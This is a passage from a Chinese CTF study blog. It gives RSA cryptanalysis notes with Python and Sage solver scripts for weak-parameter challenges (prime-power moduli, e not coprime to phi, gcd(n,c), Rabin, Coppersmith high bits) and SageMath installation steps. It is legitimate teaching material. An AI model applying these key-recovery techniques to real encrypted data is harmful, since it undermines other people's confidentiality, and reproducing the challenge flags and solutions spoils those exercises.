class="number">148424511925430832355285085986622242653116164650119278601839811809456838348201308360579207172541711367335049779204390510911294031319604192881139002646252381246691575112024047502962776542023275076827456857946499013733968522162634588753330857821421229306405469212854327011240808908334404955299250060931240865821</span></span><br><span class="line">dq= <span class="number">46499718919891753512042256824043332562579628188599554881257534157373206051013462063558177543473555667701042801266834703603013397791386747764400964376350060145521940586234916815399419075649204020285050341140996959732454059493770135591854817473937175643058380668604376797759987312600851466228301604453060674993</span></span><br><span class="line">dp= <span class="number">142333710655003285129381975633061553108365353347897720974344479656881847851071160049571693284111493690735707224010091720382284617217647771503015838348510851051285580945849520119912938971503190396671148935203517916795662212439446680229030750273953490024181996476865040448118374338738013091140796970725623029913</span></span><br><span class="line">c= <span class="number">19717919131356145411002342007533511479254120775597684622452661875292805564648015749422307039514664862428413419529876049533096947970606477676695854787457286807502628964582922773374784879459806551819337741730331777937597915727889640104583136339578788518904647309084873362461758500783634423921343109980901514994298280728150961559886893338458119937441920391275957965781890308011172861718172757876950159723089326843019779174406022143147201642738466470809603008292152193968160973116769118512212438656127645018486302418482079051867180606083540035964208124143457540388206274742292869004756069240519187723267661857029470809099</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure><h2 id="RSA·n是p的r次方"><a href="#RSA·n是p的r次方" class="headerlink" title="RSA·n是p的r次方"></a>RSA·n是p的r次方</h2><h3 id="当-n-p-r-时"><a href="#当-n-p-r-时" class="headerlink" title="当$ n = p^{r} $时"></a>当$ n = p^{r} $时</h3><p>$$ phi = p^r - p^{r-1} $$</p><p>比较简单，在rsa原理学习就已经提及，略。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum </span><br><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">23219089633250510580388184338893261190159425274266091829251069678345101374315005119889075848991325948461687799542168350589180122396501651434531030343667226410506241902501479054317717625217008857112114881864252928341340770771920275461651508679148124345837511394681152499950625703121385320234450147885925563601</span> </span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span> </span><br><span class="line"></span><br><span class="line">c=<span class="number">4777659110099869449331032200405354033599223023041765916601886190091487314989244505694085724093454432510462782520998688417537643026221506529296297782026160739262075190691284018675189858368054339063575534858807322887095235742287437139426799368719305846674897884286541494038433345483824310623372192122891409065</span> <span class="comment">#分解n #yafu-x64.exe factor() </span></span><br><span class="line"></span><br><span class="line">p=<span class="number">69416273731307471601239913553838998413594935515871627319658832112504691596643</span> </span><br><span class="line"></span><br><span class="line">phi_n=p**<span class="number">4</span>-p**<span class="number">3</span></span><br><span class="line">d=libnum.invmod(e,phi_n) </span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="当-n-p-r-·q-s-时"><a href="#当-n-p-r-·q-s-时" class="headerlink" title="当$ n = p^{r}·q^{s} $时"></a>当$ n = p^{r}·q^{s} $时</h3><p><a href="https://harry0597.com/2021/12/08/Crypto·RSA原理学习/">RSA原理学习篇</a>中，已知：</p><blockquote><p><em>如果n可以分解成两个*</em>互质<strong>的整数之积*，</strong>n = p1 × p2*<em>，</em>则*：</p><p><strong>φ(n) = φ(p1p2) = φ(p1)φ(p2)</strong></p></blockquote><p>所以φ(n) =φ($p^{r} $)  ·  φ($q^{s} $)</p><p>$$ φ(n) = (p^{r} - p^{r-1})*(q^{s} - q^{s-1}) $$</p><p>通常为了计算方便，公因式提出来。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>$$ n = p^{3}*q $$</p><p>易知：$ φ(n) = (p^{3} - p^{2})*(q-1) $</p><p>提公因式 $ p^2 $,得：</p><p>$$ φ(n) = (p-1)p^{2}(q-1) $$ </p><p>之后就是常规的求解，略。</p><h2 id="RSA·n分解为多个素数"><a href="#RSA·n分解为多个素数" class="headerlink" title="RSA·n分解为多个素数"></a>RSA·n分解为多个素数</h2><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>例： n = p* q * r</p><p>则<strong>φ(n) = φ(pqr) = φ(p)φ(q)φ(r)=(p-1)(q-1)(r-1)</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p><em>如果n可以分解成两个*</em>互质<strong>的整数之积*，</strong>n = p1 × p2<strong>，<em>则</em>：<br> **φ(n) = φ(p1p2) = φ(p1)φ(p2)</strong></p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#生成随机素数</span></span><br><span class="line">p=libnum.generate_prime(<span class="number">32</span>)</span><br><span class="line">q=libnum.generate_prime(<span class="number">32</span>)</span><br><span class="line">r=libnum.generate_prime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m=<span class="string">&quot;flag&#123;20d6e2da95dcc1fa5f5432a436c4be18&#125;&quot;</span></span><br><span class="line"><span class="comment">#字符串转数字</span></span><br><span class="line">m=libnum.s2n(m)</span><br><span class="line">n=p*q*r</span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"><span class="comment">#求逆元</span></span><br><span class="line">d=libnum.invmod(e,phi_n)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure><h2 id="RSA·e和phi不互素"><a href="#RSA·e和phi不互素" class="headerlink" title="RSA·e和phi不互素"></a>RSA·e和phi不互素</h2><p>e和phi不互素，这是一个严重的问题。</p><p>在<a href="https://harry0597.com/2021/12/08/Crypto·RSA原理学习/">rsa原理学习篇</a>中，也有说到：e得与phi互素</p><p>否则,<strong>求不出e的逆元d</strong></p><p>没有私钥d，求解rsa便是无稽之谈了</p><h3 id="对策"><a href="#对策" class="headerlink" title="对策"></a>对策</h3><p>总体而言，两字：<strong>构造</strong></p><ol><li><p>先找到e与phi的公约数</p><p>t1 = gcd(e, phi)</p></li><li><p>得到与phi互素的t2</p><p>t2 = e // t1</p></li><li><p>t1、t2代入</p><p>$ c = m^{e}modn = (m^{t1})^{t2}modn$</p></li><li><p>$ m^{t1} $当作新的明文M；t2当作新的加密指数E，则有：</p><p>$ c = M^{E}modn $</p></li></ol><p>t2(E)与phi互素，通过构造，问题已经变得常规了。</p><p>最后，对解出的M开t1次方，即得m.</p><h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">p, q, e, c</span>):</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p= <span class="number">127577058764408216374028752283743628765651360507566484643526093715329608267323381565274095814069864692746147152580906850350743742856555229701448239882612922698102985146366639955081466129923966803267071097174222576416224094182123529282235807472362341680183683025490897702891081336913842652559163341223338641607</span></span><br><span class="line">q= <span class="number">156492273708587234539506501480609692085997989594717058472605523051244522493701609615085173280972894139427194976925940854142835807192417391269823151398439665817176522629246535810290194301862945052149450578938260979300632842291287807430486629994530805358742405299538986591596966945727494262182814875780600646003</span></span><br><span class="line">e= <span class="number">750</span></span><br><span class="line">c= <span class="number">7029383721249299532521086933490698266831518266762255492452526410777276825803657150303837084263410309063739203644435184397762022380085273363900423091223180151147964276354189658062571415744140073426572149093499560918765793389358300893454490774387180728097370701432534877005948330689495694820361726719418371072834639369078180094444137972424909816959445043108154884587947573054460257114169961823509538355580857411319157089278918107229480661280354242839678709689654304688727345294473487201644985815128413154870914132135222144633969959773621933444285994038028721862094040876152694240238708737727034258171506516394913692187</span></span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><h2 id="RSA·NC不互素"><a href="#RSA·NC不互素" class="headerlink" title="RSA·NC不互素"></a>RSA·NC不互素</h2><h3 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2021绿城杯·RSA-1</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = <span class="number">2021</span> * m * <span class="number">1001</span> * p</span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line"><span class="comment">#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br></pre></td></tr></table></figure><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><ul><li><p>当加密方式为：</p><p>$$ c = (m*p)^{e}modn $$</p></li><li><p>有：<strong>p = gcd(n, c)</strong></p><p>即：<strong>当n，c不互素时，它们的最大公约数必然是p</strong></p></li></ul><h3 id="证明-1"><a href="#证明-1" class="headerlink" title="证明"></a>证明</h3><ol><li><p>由$ c = (m*p)^{e}modn $，得:</p><p>c  = $ (m*p)^{e} - kn $</p></li><li><p>两边同时模p，则：</p><p>$$ c \mod p = (m•p)^{e} \mod p = ((m•p)\mod p)^{e} \mod p  =[(m \mod p)•(p\mod p)]\mod p)^{e}\mod p $$</p></li><li><p>由$ p \mod p = 0 $，得：</p><p>$$ c \mod p = 0$$</p><p>即： <strong>c = kp</strong></p></li><li><p>因为n = pq，所以有：</p><p><strong>gcd(n, c) = p</strong></p><h3 id="代码求解"><a href="#代码求解" class="headerlink" title="代码求解"></a>代码求解</h3></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = gmpy2.gcd(n, c)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line">M=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment">#M= 2021 * 1001 * p*m</span></span><br><span class="line">m=M//(<span class="number">2021</span> * <span class="number">1001</span> * p)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="RSA·rabin算法"><a href="#RSA·rabin算法" class="headerlink" title="RSA·rabin算法"></a><a href="https://blog.csdn.net/Sway_F/article/details/109074460">RSA·rabin算法</a></h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><blockquote><p><strong>e = 2</strong> </p></blockquote><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><ul><li><p>直接给了参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">n=<span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=<span class="number">45617141162985597041928941111553655146539175146765096976546144304138540198644</span></span><br><span class="line">inv_p = invert(p, q)</span><br><span class="line">inv_q = invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % n</span><br><span class="line">b = n - <span class="built_in">int</span>(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % n</span><br><span class="line">d = n - <span class="built_in">int</span>(c)</span><br><span class="line"><span class="comment">#因为rabin 加密有四种结果，全部列出。</span></span><br><span class="line">aa=[a,b,c,d]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(i)))</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>文件形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#导入公钥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pubkey.pem&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    n =key.n</span><br><span class="line">    e =key.e</span><br><span class="line"><span class="comment">#导入密文</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=libnum.s2n(f.read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="comment">#n 在线分解</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % n</span><br><span class="line">b = n - <span class="built_in">int</span>(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % n</span><br><span class="line">d = n - <span class="built_in">int</span>(c)</span><br><span class="line"><span class="comment">#因为rabin 加密有四种结果，全部列出。</span></span><br><span class="line">aa=[a,b,c,d]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(i)))</span><br></pre></td></tr></table></figure></li></ul><h1 id="1-6-1-7"><a href="#1-6-1-7" class="headerlink" title="1.6/1.7"></a>1.6/1.7</h1><blockquote><p> 一月六日，找到并尝试改了了第二届BMZCTF赛的题解的格式</p></blockquote><h2 id="Sage"><a href="#Sage" class="headerlink" title="Sage"></a>Sage</h2><h3 id="M1-macOS·Sage安装"><a href="#M1-macOS·Sage安装" class="headerlink" title="M1 macOS·Sage安装"></a>M1 macOS·Sage安装</h3><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://blog.slight-wind.com/2021/10/09/install-sagemath-for-apple-silicon-m1/index/">Sage下载安装学习</a></p><h4 id="Install-conda"><a href="#Install-conda" class="headerlink" title="Install conda"></a>Install conda</h4><p>官网上没有直接给出M1 Mac版本的SageMath二进制安装文件，不过给出了使用conda安装Sage的方法，参考<a href="https://doc.sagemath.org/html/en/installation/conda.html">Install from conda-forge</a>。</p><p>所以如果自己的Mac上还没有安装conda的话，可以先安装一下，然后使用conda安装SageMath。</p><p>首先下载<a href="https://downloads.slight-wind.com/SageMath/Apple-Silicon-M1/Miniforge3-MacOSX-arm64.sh">Miniforge3-MacOSX-arm64.sh</a>，cd进入<code>Miniforge3-MacOSX-arm64.sh</code>所在的目录。</p><table><thead><tr><th>Mentioned files</th><th align="center">-</th><th align="center">-</th></tr></thead><tbody><tr><td><a href="http://miniforge3-macosx-arm64.sh/">Miniforge3-MacOSX-arm64.sh</a></td><td align="center"><a href="https://downloads.slight-wind.com/SageMath/Apple-Silicon-M1/Miniforge3-MacOSX-arm64.sh">本地下载</a></td><td align="center"><a href="https://share.weiyun.com/BbrjO45U">腾讯微云</a></td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> Miniforge<span class="number">3</span>-MacOSX-arm<span class="number">64</span>.sh</span><br></pre></td></tr></table></figure><p>接着一路回车，直到确认条款：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Do</span> you accept the license terms? [<span class="literal">yes</span>|<span class="literal">no</span>]  </span><br><span class="line">[<span class="literal">no</span>] &gt;&gt;&gt; <span class="literal">yes</span></span><br></pre></td></tr></table></figure><p>然后编辑配置文件<code>vim ~/.zshrc</code>，在最下面加入如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path=(<span class="string">&#x27;/Users/「这里替换成Mac用户名」/miniforge3/bin&#x27;</span> <span class="variable">$path</span>)  </span><br><span class="line"><span class="builtin-name">export</span> PATH</span><br></pre></td></tr></table></figure><p>先按<code>esc</code>键，后输入 <code>wq</code>保存并退出，然后<code>source ~/.zshrc</code>，<code>conda info</code>应该就可以看到了，到这里conda安装完成。</p><p>在终端输入下面这些，给conda换到清华源，这样在使用国内网络不走代理的情况下安装一些东西就更快了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/anaconda/</span>pkgs<span class="regexp">/main/</span>  </span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/anaconda/</span>pkgs<span class="regexp">/free/</span>  </span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/anaconda/</span>cloud<span class="regexp">/conda-forge/</span>  </span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/anaconda/</span>cloud<span class="regexp">/msys2/</span>  </span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/anaconda/</span>cloud<span class="regexp">/bioconda/</span>  </span><br><span class="line">conda config --add channels https:<span class="regexp">//mi</span>rrors.ustc.edu.cn<span class="regexp">/anaconda/</span>cloud<span class="regexp">/menpo/</span>  </span><br><span class="line">conda config --set show_channel_urls yes</span><br></pre></td></tr></table></figure><p>然后输入<code>conda config --show | grep https</code>可以看到已经更新成功的上面的链接。</p><blockquote><p>如果是直接新开的终端，直接输入conda是没有反应的，需要先<code>source ~/.zshrc</code>一下。</p></blockquote><h4 id="Install-SageMath"><a href="#Install-SageMath" class="headerlink" title="Install SageMath"></a>Install SageMath</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conda<span class="built_in"> config </span>--append channels conda-forge</span><br><span class="line">conda<span class="built_in"> config </span>--<span class="builtin-name">set</span> channel_priority strict</span><br><span class="line">conda create -n sage sage <span class="attribute">python</span>=3.9</span><br><span class="line"></span><br><span class="line"><span class="comment"># Proceed ([y]/n)? y</span></span><br><span class="line"><span class="comment"># 然后就开始下载安装了</span></span><br></pre></td></tr></table></figure><hr><h3 id="M1-macOS·Sage运行"><a href="#M1-macOS·Sage运行" class="headerlink" title="M1 macOS·Sage运行"></a>M1 macOS·Sage运行</h3><p>这时输入<code>conda activate sage</code>，然后输入<code>sage</code>就可以看到sage启动了，也可以使用<code>sage xxx.sage</code>来执行一个sage脚本，这样就是安装完成了。</p><blockquote><p>注意每次启动都需要先<code>conda activate sage</code>进入sage。</p></blockquote><h4 id="Sage·交互模式"><a href="#Sage·交互模式" class="headerlink" title="Sage·交互模式"></a>Sage·交互模式</h4><p><code>conda activate sage</code>后输入<code>sage</code></p><h4 id="Sage·网页模式（推荐"><a href="#Sage·网页模式（推荐" class="headerlink" title="Sage·网页模式（推荐"></a>Sage·网页模式（推荐</h4><p><code>conda activate sage</code>后输入<code>sage -n</code></p><p><img src="https://s2.loli.net/2022/01/07/TPJt3RyIE4gzN5C.png" alt="image-20220107193401892"></p><h2 id="1-8"><a href="#1-8" class="headerlink" title="1.8"></a>1.8</h2><h3 id="m高位"><a href="#m高位" class="headerlink" title="m高位"></a>m高位</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phase2</span>(<span class="params">high_m, n, c</span>):</span></span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line"></span><br><span class="line">n= <span class="number">16375911057984467860173028499662793813198989070891462046702689271326139635781678292779095962528585009670015786235494254339716198163498114440710970519760731615457538963588012609421435357625310123852269659556877780556282784378911243624799312161395869291700339099744622787092292212808041739935363726641015733082591519285930439717736591210957039387077203590963514630879038078615201950805057733038622070074246926048776699133348654093003217709061073510046710565744672093957004519016895478465918909294337641778357708633353664132944153092793959582685432330892190960961439661225639169934805918097911051922729785720701933534021</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">175676150266403934024028881165956357569100114594293998449367661494592439256350774016927790942005197030835672661768700955232102741828268826317608643103085037913845664530507219457425306700667637263739558920826441431873842792152100711788904901597274447160613809337879563457097769364821425046114008763402341</span></span><br><span class="line">high_m= <span class="number">56006392793404656900162277604003911130977996870658599363889243117614813715239971694356275604343488512</span></span><br><span class="line"></span><br><span class="line">phase2(high_m, n, 